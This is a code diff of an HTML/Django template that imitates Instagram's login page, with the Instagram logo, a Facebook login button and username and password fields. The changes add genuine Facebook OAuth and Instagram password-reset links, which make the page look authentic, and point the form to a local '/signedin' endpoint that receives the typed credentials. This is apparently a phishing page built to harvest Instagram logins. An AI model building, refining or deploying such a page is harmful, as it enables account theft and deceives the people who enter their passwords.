@@ -9,9 +9,8 @@
 </head>
 <body>
     <img class="mainimg" src="/static/photo/instagram.png" alt="none">
-    <p class="protext">Pro</p>
     <div id="loginshown">
-        <button class="loginwithfbbutt"><img src="/static/photo/fb.png" class="fbimg"></button>
+        <a href="https://www.facebook.com/login.php?skip_api_login=1&api_key=124024574287414&kid_directed_site=0&app_id=124024574287414&signed_next=1&next=https%3A%2F%2Fwww.facebook.com%2Fdialog%2Foauth%3Fclient_id%3D124024574287414%26redirect_uri%3Dhttps%253A%252F%252Fwww.instagram.com%252Faccounts%252Fsignup%252F%26state%3D%257B%2522fbLoginKey%2522%253A%2522i9w1h1udj20q1c934621srwdyn1d6p6ak59sphjmw1e7q45lo7a%2522%252C%2522fbLoginReturnURL%2522%253A%2522%252Ffxcal%252Fdisclosure%252F%253Fnext%253D%25252F%2522%257D%26scope%3Demail%26response_type%3Dcode%252Cgranted_scopes%26locale%3Den_US%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Dc0831260-0750-4c41-a7dd-bd56e4412a09%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.instagram.com%2Faccounts%2Fsignup%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%2522fbLoginKey%2522%253A%2522i9w1h1udj20q1c934621srwdyn1d6p6ak59sphjmw1e7q45lo7a%2522%252C%2522fbLoginReturnURL%2522%253A%2522%252Ffxcal%252Fdisclosure%252F%253Fnext%253D%25252F%2522%257D%23_%3D_&display=page&locale=en_GB&pl_dbl=0" style="text-decoration: none;"><button class="loginwithfbbutt"><img src="/static/photo/fb.png" class="fbimg"></button></a>
         <table class="ormaintable">
             <td class="orpara1">
                 <hr class="orline1">
@@ -23,13 +22,13 @@
                 <hr class="orline2">
             </td>
         </table>
-        <form action="/enter" id="form" class="form" method="POST">
+        <form action="/signedin" id="form" class="form" method="POST">
             {% csrf_token %}
             <div class="inputpara">
                 <input type="text" required id="username" name="username" class="usrname"
                     placeholder=" email or phone number"><br><br>
                 <input type="password" required id="password" name="password" class="password" placeholder=" password">
-                <p class="formlinkpara"><a onclick="forget()" class="formlink" href="javascript:void(0)">Forgot
+                <p class="formlinkpara"><a class="formlink" href="https://www.instagram.com/accounts/password/reset/?hl=en">Forgot
                         password!</a><br><br>
 
                     <input type="submit" value="Log in" class="submitbutton">
